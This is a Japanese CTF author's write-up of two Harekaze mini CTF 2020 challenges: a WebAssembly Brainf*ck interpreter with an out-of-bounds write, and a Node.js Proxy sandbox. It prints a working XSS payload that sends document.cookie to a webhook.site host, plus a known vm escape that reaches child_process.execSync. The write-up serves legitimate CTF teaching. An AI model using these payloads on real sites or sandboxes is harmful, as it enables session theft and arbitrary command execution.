> Now it is the era of WebAssembly. To learn WebAssembly, I wrote a Brainf*ck interpreter in C and compiled to wasm.
> 
> (URL)
> 
> ---
> 
> 想定難易度: medium-hard  
> 添付ファイル: [wasm-bf.zip](../files/20201227-harekaze-mini-ctf-2020/wasm-bf.zip)

WebAssembly を使って Brainf\*ck のコードを実行してくれる Web アプリケーションです。`main.js` を読むと、`location.hash` に Brainf\*ck コードが入っていれば自動で実行してくれることがわかります。

```javascript
  const program = decodeURIComponent(location.hash.slice(1));
  if (program.length > 1) {
    edit.value = program;
    execute(program);
  }
```

また、Brainf*ck コードの実行結果は `innerHTML` を使って出力されており、XSS ができそうな雰囲気があります。

```javascript
    let buffer = '';
    output.innerHTML = '';
    const importObject = {
      env: {
        _get_char: getchar(program),
        _print_char(arg) {
          buffer += String.fromCharCode(arg);
        },
        _flush() {
          output.innerHTML += buffer;
          buffer = '';
        }
      }
    };
```

ということで、`<s>test</s>` を出力するような Brainf\*ck コードを実行してみましたが…出力結果を見ると `<` と `>` がそれぞれ `&lt;` と `&gt;` にエスケープされていることがわかります。どういうことでしょうか。

Brainf\*ck インタプリタである `main.wasm` のソースコードの `main.c` を読むとその理由がわかります。文字の出力処理である `print_char` 関数では、出力する文字が `<` か `>` であればエスケープしています。

```c
void print_char(char c) {
  if (buffer_pointer + 4 >= buffer + BUFFER_SIZE) {
    flush();
  }

  // Prevent XSS!
  if (c == '<' || c == '>') {
    buffer_pointer[0] = '&';
    buffer_pointer[1] = c == '<' ? 'l' : 'g';
    buffer_pointer[2] = 't';
    buffer_pointer[3] = ';';
    buffer_pointer += 4;
  } else {
    *buffer_pointer = c;
    buffer_pointer++;
  }
}
```

これをなんとかできないかソースコードをよく見てみると、与えられた Brainf\*ck コードを実行する関数である `execute` に脆弱性が見つかります。

`>` と `<` という命令の処理では、ポインタが `memory` の範囲外を指しているかどうかはチェックされていません。これを使ってポインタが `memory` 外の場所を指すようにした上で、`+` や `-` でその内容を書き換えることができます。

```c
      case '>': {
        pointer++;
        break;
      }
      case '<': {
        pointer--;
        break;
      }
```

`+` や `-` で本来書き込まれる先は `memory` です。

```c
      case '+': {
        memory[pointer]++;
        break;
      }
      case '-': {
        memory[pointer]--;
        break;
      }
```

この前後に使えそうなものはないかその宣言を見てみると、以下のように `buffer` が近くに配置されていることがわかります。`buffer` に書き込まれた内容は後々 JavaScript 側で `innerHTML` に出力されますから、これを使って XSS ができないでしょうか。

```c
unsigned char buffer[BUFFER_SIZE] = {0};
unsigned char *buffer_pointer = buffer;
unsigned char memory[MEMORY_SIZE] = {0};
```

### ペイロードの作成
まず [Brainfuck text generator](https://copy.sh/brainfuck/text.html) という大変便利なツールを使って `=s=test=s=` を出力するような Brainf\*ck コードを生成します。

```
----[---->+<]>--.---[->++<]>-.+[-->+<]>+++.---[->++<]>.+++[->+++<]>.[--->+<]>----.+.[-->+<]>+++.---[->++<]>-.+[-->+<]>+++.
```

Google Chrome の DevTools を使って `main.wasm` を逆アセンブルし、以下のように `initialize` 関数の処理を `main.c` と比較すると `memory` と `buffer` の位置関係がわかります。これを使って `=` を `<` と `>` に上書きしてやりましょう。

```c
WASM_EXPORT
void initialize() {
  buffer_pointer = buffer;
  for (int i = 0; i < BUFFER_SIZE; i++) {
    buffer[i] = '\0';
  }
  for (int i = 0; i < MEMORY_SIZE; i++) {
    memory[i] = '\0';
  }
  for (int i = 0; i < PROGRAM_MAX_SIZE; i++) {
    program[i] = '\0';
  }
}
```

![main.wasmの逆アセンブル結果](../images/2020-12-28_wasmbf.png)

以下のような Brainf\*ck コードを実行すると、斜線の入った `test` が表示されました。

```
----[---->+<]>--.---[->++<]>-.+[-->+<]>+++.---[->++<]>.+++[->+++<]>.[--->+<]>----.+.[-->+<]>+++.---[->++<]>-.+[-->+<]>+++.
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
->>+>>>>>->>+
```

あとは Cookie を盗み出すような JavaScript コードを実行できるペイロードを作ればよさそうです。以下の JavaScript コードを実行して出力されたペイロードを XSS bot に投げるとフラグが得られました。

```javascript
// Aimg src=x onerror=eval(decodeURIComponent(location.search.slice(1)))A
const program = '----[---->+<]>++.[--->+<]>--.++++.------.-[--->+<]>--.---[->++++<]>-.-.++++[->+++<]>+.[--->++<]>-----.-[->++<]>.[---->+<]>++.+++++[->+++<]>.-.---------.+++++++++++++..---.+++.[-->+<]>++++.>--[----->+<]>-.[--->+<]>-.[->+++<]>-.+++++++++++.[--->+<]>++++.+[--->+<]>+.+.--.++++++++++++.-----------.+.>-[--->+<]>.---.---------.------.+[--->+<]>+++.--.+++.-.-.---------.+++++++++.++++++.+[--->+<]>+.----[->+++<]>.+++.------------.--.--[--->+<]>-.-----------.++++++.-.[----->++<]>++.[--->++<]>-.++++[->+++<]>.----.--[--->+<]>---.++++[->+++<]>+.+++++.---[->+++<]>-.[--->++<]>-.-------.---.------.++.--[->+++<]>-.+++++++++.--------...+[-->+++<]>++.' +
                '<'.repeat(74) + '-'.repeat('A'.charCodeAt(0) - '>'.charCodeAt(0)) +
                '<'.repeat(69) + '-'.repeat('A'.charCodeAt(0) - '<'.charCodeAt(0))
console.log('?(new Image).src=["//webhook.site/…?",document.cookie]#' + encodeURIComponent(program));
```

```
HarekazeCTF{I_th1nk_w4sm_1s_e4s1er_t0_re4d_th4n_4smjs}
```

---

Pwn + Web 問です。WebAssembly での Pwn の過去問として CODE BLUE CTF 2018 Quals の [Secret Mailer Service 2.0](http://charo-it.hatenablog.jp/entry/2018/08/07/112518#Secret-Mailer-Service-20-pwn) や HackTM CTF Finals 2020 の [Widmanstätten](https://ptr-yudai.hatenablog.com/entry/2020/12/16/005059#Widmanst%C3%A4tten---482pts) が挙げられますが、それらの問題ほど難しくない簡単なものも作ってみたいという気持ちがあり、このような単純な範囲外アクセスを使う問題を作りました。

`location.search` などに Cookie を盗み出す JavaScript コードを仕込んで、それを実行する stager のようなペイロードを作ることで文字数を抑えるという流れを想定していました。Brainf\*ck のコードゴルフを強いる意図で実行できる文字数を 1000 文字以内に制限したというわけではありません。

が、XSS bot のログを見るとほとんどのチームがコードゴルフによって stager なしに解いており、それなら中途半端な文字数の制限は設けるべきでなかったなあと思っています。アンケートでもこの問題について「解くのが面倒なだけ」「コードゴルフはしたくなかった」といったご意見をいただいていて、もう少し工夫すべきでした。

## [Misc 322] Proxy Sandbox (7 solves)
> 私は秘密を守るのに Proxy が便利だと思っています。
> 
> (URL)
> 
> ---
> 
> I think Proxy can be used for protecting secrets.
> 
> (URL)
> 
> ---
> 
> 想定難易度: medium-hard  
> 添付ファイル: [proxy-sandbox.zip](../files/20201227-harekaze-mini-ctf-2020/proxy-sandbox.zip)

与えられたソースコードを見てみましょう。

```javascript
const fastify = require('fastify');
const fs = require('fs');
const path = require('path');
const pug = require('pug');
const vm = require('vm');

const app = fastify({ logger: true });
app.register(require('point-of-view'), {
  engine: { pug },
  root: path.join(__dirname, 'view')
});
app.register(require('fastify-static'), {
  root: path.join(__dirname, 'static'),
  prefix: '/static/',
});

const FLAG = 'HarekazeCTF{<censored>}';
const template = `
// no prototype pollution!
Object.freeze(Object.prototype);
Object.freeze(Object);
// no hoisting!
const Proxy = globalThis.Proxy;

const obj = new Proxy({
  flag: '${FLAG}'
}, {
  get(target, prop) {
    if (prop === 'flag' || !(prop in target)) {
      return undefined;
    }
    return target[prop];
  },
  getOwnPropertyDescriptor(target, prop) {
    if (prop === 'flag' || !target.hasOwnProperty(prop)) {
      return undefined;
    }
    return Reflect.getOwnPropertyDescriptor(...arguments);
  }
});

CODE
`;

app.get('/', async (request, reply) => {
  let output = '';
  const code = request.query.code + '';

  if (code && code.length < 150) {
    try {
      const result = vm.runInNewContext(template.replace('CODE', code), {}, { timeout: 500 });
      output = result + '';
    } catch (e) {
      output = 'nope';
    }
  } else {
    output = 'nope';
  }

  return reply.view('index.pug', {
    title: 'Proxy Sandbox', output
  });
});

app.get('/source', async (request, reply) => {
  const code = fs.readFileSync(__filename).toString();
  reply.type('application/javascript').code(200);
  reply.send(code.replace(/HarekazeCTF\{.+\}/, 'HarekazeCTF{<censored>}'));
});

const start = async () => {
  try {
    await app.listen(3000, '0.0.0.0');
    app.log.info(`server listening on ${app.server.address().port}`);
  } catch (err) {
    app.log.error(err);
    process.exit(1);
  }
};
start();
```

150 文字以内であれば `vm.runInNewContext` 中で好きな JavaScript コードを実行してくれる Web アプリケーションのようです。 

`obj` という `Proxy` オブジェクトの `flag` プロパティを読み出せばよいようです。ただし、`get` メソッドと `getOwnPropertyDescriptor` メソッドの定義を見ればわかるように、`prop === 'flag'` というチェックによって `flag` プロパティへのアクセスは制限されています。

変数の巻き上げ (`function Proxy(arg) { … }` を入力すると、`obj` の定義より後方に関数の定義があっても、もとの `Proxy` でなくその関数が使われるやつ) によって `Proxy` を置き換え、`obj` の定義時の処理を乗っ取ってもとの `{ flag: '${FLAG}' }` というオブジェクトを取得したくなりますが、これは `const Proxy = globalThis.Proxy;` によって制限されています。

`getOwnPropertyDescriptor` メソッドでは `!target.hasOwnProperty(prop)` と `Object.prototype.hasOwnProperty` が使われているのでこれを置き換えてもとのオブジェクトである `target` を取得したくなりますが、こちらも `Object.freeze` によって制限されています。

他に置き換え可能な関数を探していると、`getOwnPropertyDescriptor` メソッドで使われている `Reflect.getOwnPropertyDescriptor` はなにも置き換えの対策がされていないことがわかります。試してみましょう。

```javascript
Reflect.getOwnPropertyDescriptor = (target) => {
  console.log('[*]', target);
};

const obj = new Proxy({
  flag: 'flag{DUMMY}'
}, {
  getOwnPropertyDescriptor(target, prop) {
    if (prop === 'flag' || !target.hasOwnProperty(prop)) {
      return undefined;
    }
    return Reflect.getOwnPropertyDescriptor(...arguments);
  }
});

obj.a = 123;
Object.getOwnPropertyDescriptor(obj, 'a');
```

これを実行します。

```
$ node test.js
[*] { flag: 'flag{DUMMY}', a: 123 }
```

これは使えそうです。ペイロードを組み立てましょう。

```javascript
a = 'getOwnPropertyDescriptor';
Reflect[a] = value => {
  return { configurable: true, value };
};
obj.b = 123;
Object[a](obj, 'b').value.flag;
```

これを実行すると、以下のようにフラグが得られました。

```
HarekazeCTF{y0u_4re_4ppr0xim4tely_pr0_0f_pr0xy}
```

### 非想定解
実は (有名な `vm` からのエスケープ手段であるところの) `this.constructor.constructor('return process')()` を利用すると `process` にアクセスすることができます。

これを使えば、`this.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat index.js | grep HarekazeCTF')` でフラグが得られます。

---

機会があれば `Proxy` で遊ぶ問題を作りたいな～と思っていたので作りました。

非想定解について、事前のチーム内での問題チェック時に上記の方法で `process` にアクセスし、(その時は環境変数からフラグを読み込んでいたために) `process.env` からフラグが得られるとの指摘をいただいていました。しかしながら、何を思ったかフラグをソースコード中にハードコードして `process.env` からは得られないようにしただけで、それ以外は全く変更を加えないまま出題してしまいました。反省しています。